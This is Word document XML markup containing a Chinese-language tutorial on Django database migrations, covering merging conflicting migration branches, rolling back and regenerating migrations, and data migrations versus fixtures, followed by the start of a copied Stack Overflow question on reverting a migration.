    <w:p w14:paraId="752D016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Merging berguiapp</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A9BAE0C"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Branch 0003_userprofile_age</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2170F647"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Add field age to userprofile</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05A4B533"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Branch 0003_userprofile_address</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AC809DF"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Add field address to userprofile</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B3A9E77"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Merging will only work if the operations printed above do not conflict</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07DEDEA3"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with each other (working on different fields or models)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="072F672A" w14:textId="32DDF3CD" w:rsidR="00B61AC7" w:rsidRPr="0038277E"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Do you want to merge these migration branches? [y/N] y</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52749AEC"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Created new merge migration .../migrations/0004_merge.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F4EA435"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 python manage.py migrate</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A788C06"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Operations to perform:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6720AB61"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Synchronize unmigrated apps: ...</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="360F0C16"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Apply all migrations: ... myapp, ...</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55F2A889"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Synchronizing apps without migrations:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="645AD5CA"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Creating tables...</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29F0EE15"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Installing custom SQL...</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CF76D4E"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Installing indexes...</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62E41647"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Running migrations:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66601B8D"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Applying myapp.0003_userprofile_age... OK</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EB9BAB4"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Applying myapp.0003_userprofile_address... OK</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48713E3F" w14:textId="77777777" w:rsidR="00D8288D"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Applying myapp.0004_merge... OK</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40955DBF" w14:textId="363C756A" w:rsidR="00B61AC7" w:rsidRPr="0038277E"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hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>$</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D3A37A9"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请记住这条信息 “Merging will only work if the operations printed above do not conflict with each other (working on different fields or models)”。如果有复杂的修改，那么Django的可能不会正确合并 migrations，你将需要使用另一种方法。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D762EF9"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r w:rsidRPr="00BC6A81">
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="4F4F4F"/>
          <w:kern w:val="0"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="33"/>
        </w:rPr>
        <w:t>方法2：回滚然后再次合并</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39F50BD5"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若果是第一次失败，你应该选择这个方法，或者你不认同有这么多的 migration 文件在你应用程序中。（尽管 Django 允许多个 migration 文件在你的项目中）。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08D3AA26" w14:textId="77777777" w:rsidR="00B61AC7" w:rsidRPr="002101A1" w:rsidRDefault="00B61AC7" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="48"/>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使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="002101A1">
        <w:rPr>
          <w:rFonts w:ascii="DejaVu Sans Mono" w:eastAsia="宋体" w:hAnsi="DejaVu Sans Mono" w:cs="DejaVu Sans Mono"/>
          <w:color w:val="C7254E"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F9F2F4"/>
        </w:rPr>
        <w:t>python manage.py migrate myapp my_most_recent_common_migration</w:t>
      </w:r>
      <w:r w:rsidRPr="002101A1">
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> 在你的分支中回滚最近正常的 migration。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B331706" w14:textId="77777777" w:rsidR="00B61AC7" w:rsidRPr="002101A1" w:rsidRDefault="00B61AC7" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="48"/>
        </w:numPr>
        <w:spacing w:before="120"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你也可以这么做：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="320702E5" w14:textId="77777777" w:rsidR="00B61AC7" w:rsidRPr="002101A1" w:rsidRDefault="00B61AC7" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="49"/>
        </w:numPr>
        <w:spacing w:line="300" w:lineRule="exact"/>
        <w:ind w:left="96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暂时移除你的 migration，执行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，再次添加你的 migration 然后执行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。如果你的 migrations 涉及到不同的 models，同时又要有不同的 migration 生成，你应该使用这个 case。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5206CA21" w14:textId="77777777" w:rsidR="00B61AC7" w:rsidRPr="002101A1" w:rsidRDefault="00B61AC7" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="49"/>
        </w:numPr>
        <w:spacing w:line="300" w:lineRule="exact"/>
        <w:ind w:left="96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lastRenderedPageBreak/>
        <w:t>移除这两部分 migrations 同时执行 </w:t>
      </w:r>
      <w:r w:rsidRPr="002101A1">
        <w:rPr>
          <w:rFonts w:ascii="DejaVu Sans Mono" w:eastAsia="宋体" w:hAnsi="DejaVu Sans Mono" w:cs="DejaVu Sans Mono"/>
          <w:color w:val="C7254E"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F9F2F4"/>
        </w:rPr>
        <w:t>python manage.py makemigrations</w:t>
      </w:r>
      <w:r w:rsidRPr="002101A1">
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> 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 获得一个从 </w:t>
      </w:r>
      <w:r w:rsidRPr="002101A1">
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>0003_userprofile_age.py</w:t>
      </w:r>
      <w:r w:rsidRPr="002101A1">
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> 和 </w:t>
      </w:r>
      <w:r w:rsidRPr="002101A1">
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>0003_userprofile_address.py</w:t>
      </w:r>
      <w:r w:rsidRPr="002101A1">
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> 融合后的 migration。如果你想当前的改变只生成一个 migration， 同时只涉及到相同的 model，你应该使用这个 case。需要注意的是，如果这个 migration 在别的分支中也删除了，确保没有人拥有它和任何人都知道这个已经被删除。如果你删除了，同时有有人使用了，这会导致一些恶心的 BUG。应该遵循一个基本的原装：不要删除后者修改其他人使用的 migration。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69854401" w14:textId="77777777" w:rsidR="00B61AC7" w:rsidRPr="002101A1" w:rsidRDefault="00B61AC7" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="49"/>
        </w:numPr>
        <w:spacing w:line="300" w:lineRule="exact"/>
        <w:ind w:left="96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把 migration “0003_“ 改成 “0004_“(这不是强制的，但是得可以这么做)，修改依赖属性指向 “0003_” migration 同时执行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。这个方案可以替代第一种方案，但是你不得不手动修改 migration 的依赖属性指向最新的一个。你更喜欢回滚然后重新创建 migration 或者你喜欢手动修改 migration ，这都带有浓重的个人色彩。就我个人而言我喜欢第一个。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="388EC968"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执行下面这个 snippet 之前，我移除两个 migrations （考虑到这两个分支都是我创建并且没有别人使用，因此我也使用第二种方法解释以上的东西）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58D17BF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manage.py migrate myapp 0002_auto_20160316_0909</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="778D7CC2"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Operations to perform:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09F80A0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Target specific migration: 0002_auto_20160316_0909, from myapp</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BA46EA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Running migrations:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E35CF8A"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Unapplying myapp.0003_userprofile_age... OK</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3167B6E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manage.py makemigrations</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72E17B1C"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Migrations for 'myapp':</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F3CD94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0003_auto_20160318_1345.py:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C687F9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Add field address to userprofile</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FF394E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Add field age to userprofile</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EA5369E"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manage.py migrate</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="632D223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Operations to perform:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55876C0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Synchronize unmigrated apps: ...</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47474724"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Apply all migrations: ... myapp, ...</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="148115AF"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Synchronizing apps without migrations:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="372999B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Creating tables...</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51FBC63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Installing custom SQL...</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42F0350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Installing indexes...</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="142F097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Running migrations:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B8BBFDF"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Applying myapp.0003_auto_20160318_1345... OK</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B4CC87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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BB28FC2"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如果有来自分支1的 migration 在相同的地方做和修改，你应该要小心地决定哪些是需要保留的，然后重新 migration。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C41F74C"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r w:rsidRPr="00BC6A81">
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="4F4F4F"/>
          <w:kern w:val="0"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="33"/>
        </w:rPr>
        <w:t>方法3: 手动修改 migrations</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59B8CEC9"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lastRenderedPageBreak/>
        <w:t>这种情况是极少发生的，但是如果你真的到了无法选择的地步，阅读 Django 中 writing Django migrations 的文档（</w:t>
      </w:r>
      <w:hyperlink r:id="rId148" w:tgtFrame="_blank" w:history="1">
        <w:r w:rsidRPr="002101A1">
          <w:rPr>
            <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
            <w:color w:val="6795B5"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>英文</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="002101A1">
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="4D4D4D"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:hyperlink r:id="rId149" w:tgtFrame="_blank" w:history="1">
        <w:r w:rsidRPr="002101A1">
          <w:rPr>
            <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
            <w:color w:val="6795B5"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>中文</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="002101A1">
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="4D4D4D"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>），可以让你快速熟悉 migration 的主要部分。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21E1ED5B"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bookmarkStart w:id="77" w:name="t6"/>
      <w:bookmarkEnd w:id="77"/>
      <w:r w:rsidRPr="00BC6A81">
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="4F4F4F"/>
          <w:kern w:val="0"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="33"/>
        </w:rPr>
        <w:t>数据迁移</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="735B8AF5"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在一个项目中其中一个迁移必定是数据迁移。假如有那么一个需求，把一个 ManyToMany 的关系改变成 OneToMany 的关系或者要报一个表分成两个表，这样必然有生成一个 migration。但是数据发生了什么？我们仍然需要数据在当前的数据库中。这就体现了数据迁移带来的好处，你要写一个自定义的 migration，这些脚本会把在执行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color w:val="4D4D4D"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> 之后的表结构和你的数据关联起来。你数据将会在新的表中。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19EEBD1C"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需要明确你的数据迁移需要依赖什么。这个依赖会涉及到最后生成的 migration （名字，或者更精确的），同时需要被开发者指定。但是如果我们在产品服务器中有不同的 migration 设定，需要在每台服务器上小心地做出相应地依赖设定。虽然这是无趣的，但是可以避免复杂的迁移机制。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76D9A86C"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 fixture 和数据迁移中还是有一些不同。Fixtures 是导入一些默认的数据到数据库中，然而数据迁移是在数据库上改变一些数据。fixture 是一个放在 fixture 文件夹中的一个 JSON 文件，使用命令：</w:t>
      </w:r>
      <w:r w:rsidRPr="002101A1">
        <w:rPr>
          <w:rFonts w:ascii="DejaVu Sans Mono" w:eastAsia="宋体" w:hAnsi="DejaVu Sans Mono" w:cs="DejaVu Sans Mono"/>
          <w:color w:val="C7254E"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F9F2F4"/>
        </w:rPr>
        <w:t>python manage.py laoddata myapp/fixtures/my_fixture.json</w:t>
      </w:r>
      <w:r w:rsidRPr="002101A1">
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="4D4D4D"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> 导入。这种方法是把默认的一类对象放入数据库中。另一种方法是，在 migrations 的文件夹中的数据迁移是一个 migration 文件。你不能使用数据迁移添加新的条目到你的数据库中，你只能在数据库众包修改他们。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="171F1B7E" w14:textId="77777777" w:rsidR="00B61AC7" w:rsidRPr="00BC6A81" w:rsidRDefault="00B61AC7" w:rsidP="00BC6A81">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:line="380" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="2"/>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="4F4F4F"/>
          <w:kern w:val="0"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="33"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="78" w:name="t7"/>
      <w:bookmarkEnd w:id="78"/>
      <w:r w:rsidRPr="00BC6A81">
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="4F4F4F"/>
          <w:kern w:val="0"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="33"/>
        </w:rPr>
        <w:t>结束</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F6E65C0"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migrations 是一种很有用的数据库更新机制。当你使用 Django 和数据库工作时候，你必须考虑使用 migrations。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69423A55"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即使你不是一个后端程序员，或者你使用不同的框架，没有使用类似的机制，尝试去理解他们背后的逻辑。他们也许就不是你第一看见的那么复杂，所有的问题都可以被很好的解决。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="145D74E9" w14:textId="294A6823" w:rsidR="00B61AC7" w:rsidRPr="00BC6A81" w:rsidRDefault="00B61AC7" w:rsidP="00BC6A81">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000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002101A1">
        <w:rPr>
          <w:rFonts w:ascii="DejaVu Sans Mono" w:eastAsia="宋体" w:hAnsi="DejaVu Sans Mono" w:cs="DejaVu Sans Mono"/>
          <w:color w:val="ABB2BF"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="282C34"/>
        </w:rPr>
        <w:t>&lt;/div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="605ABA53" w14:textId="77777777" w:rsidR="00B61AC7" w:rsidRPr="00BC6A81" w:rsidRDefault="00D96E02" w:rsidP="00BC6A81">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="FEFEF2"/>
        <w:spacing w:line="440" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:jc w:val="center"/>
        <w:outlineLvl w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="36"/>
          <w:sz w:val="42"/>
          <w:szCs w:val="42"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId150" w:history="1">
        <w:r w:rsidR="00B61AC7" w:rsidRPr="00BC6A81">
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="000000"/>
            <w:kern w:val="36"/>
            <w:sz w:val="42"/>
            <w:szCs w:val="42"/>
          </w:rPr>
          <w:t>django</w:t>
        </w:r>
        <w:r w:rsidR="00B61AC7" w:rsidRPr="00BC6A81">
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="000000"/>
            <w:kern w:val="36"/>
            <w:sz w:val="42"/>
            <w:szCs w:val="42"/>
          </w:rPr>
          <w:t>使用</w:t>
        </w:r>
        <w:r w:rsidR="00B61AC7" w:rsidRPr="00BC6A81">
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="000000"/>
            <w:kern w:val="36"/>
            <w:sz w:val="42"/>
            <w:szCs w:val="42"/>
          </w:rPr>
          <w:t>migrations</w:t>
        </w:r>
        <w:r w:rsidR="00B61AC7" w:rsidRPr="00BC6A81">
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="000000"/>
            <w:kern w:val="36"/>
            <w:sz w:val="42"/>
            <w:szCs w:val="42"/>
          </w:rPr>
          <w:t>迁移版本和数据库中报错解决方案</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="13AAFE63" w14:textId="77777777" w:rsidR="00B61AC7" w:rsidRPr="009B62F8" w:rsidRDefault="00B61AC7" w:rsidP="00B61AC7">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="FEFEF2"/>
        <w:spacing w:before="150" w:after="150" w:line="240" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009B62F8">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>回滚</w:t>
      </w:r>
      <w:r w:rsidRPr="009B62F8">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>django</w:t>
      </w:r>
      <w:r w:rsidRPr="009B62F8">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>的</w:t>
      </w:r>
      <w:r w:rsidRPr="009B62F8">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>migration</w:t>
      </w:r>
      <w:r w:rsidRPr="009B62F8">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21EDD596" w14:textId="77777777" w:rsidR="00B61AC7" w:rsidRPr="009B62F8" w:rsidRDefault="00D96E02" w:rsidP="00B61AC7">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="FEFEF2"/>
        <w:spacing w:line="240" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId151" w:history="1">
        <w:r w:rsidR="00B61AC7" w:rsidRPr="009B62F8">
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
            <w:color w:val="075DB3"/>
            <w:kern w:val="0"/>
            <w:szCs w:val="20"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>https://stackoverflow.com/questions/32123477/django-revert-last-migration</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3C27A91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I</w:t>
      </w:r>
      <w:r w:rsidRPr="009B62F8">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="800000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>'ve made a migration that added a new table and want to revert it and delete the migration, without creating a new migration.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="588FC4A1"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How </w:t>
      </w:r>
      <w:r w:rsidRPr="009B62F8">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="0000FF"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>do</w:t>
      </w:r>
      <w:r w:rsidRPr="009B62F8">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> I </w:t>
      </w:r>
      <w:r w:rsidRPr="009B62F8">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="0000FF"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>do</w:t>
      </w:r>
      <w:r w:rsidRPr="009B62F8">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> it? Is there a command to revert </w:t>
      </w:r>
      <w:r w:rsidRPr="009B62F8">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="0000FF"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>last</w:t>
      </w:r>
      <w:r w:rsidRPr="009B62F8">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> migration and </w:t>
      </w:r>
      <w:r w:rsidRPr="009B62F8">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="0000FF"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>then</w:t>
      </w:r>
      <w:r w:rsidRPr="009B62F8">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> I can simply delete the migration </w:t>
      </w:r>
      <w:r w:rsidRPr="009B62F8">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="0000FF"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>file</w:t>
      </w:r>
      <w:r w:rsidRPr="009B62F8">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>?</w:t>
      </w:r>
    </w:p>
